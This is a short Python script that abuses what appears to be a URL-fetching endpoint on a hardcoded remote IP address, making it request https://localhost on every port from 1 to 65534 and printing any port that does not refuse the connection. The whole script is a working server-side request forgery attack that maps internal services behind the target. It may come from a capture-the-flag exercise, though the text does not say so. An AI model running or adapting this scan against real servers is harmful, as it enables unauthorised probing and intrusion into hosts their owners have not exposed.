import requests
from tqdm import tqdm

url = 'http://185.66.86.55:3300/go'

for port in tqdm(range(1, 65535)):
    r = requests.post(url, data={'url' : f'https://localhost:{port}'})
    if 'connect: connection refused' not in r.text:
        print(port, r.text)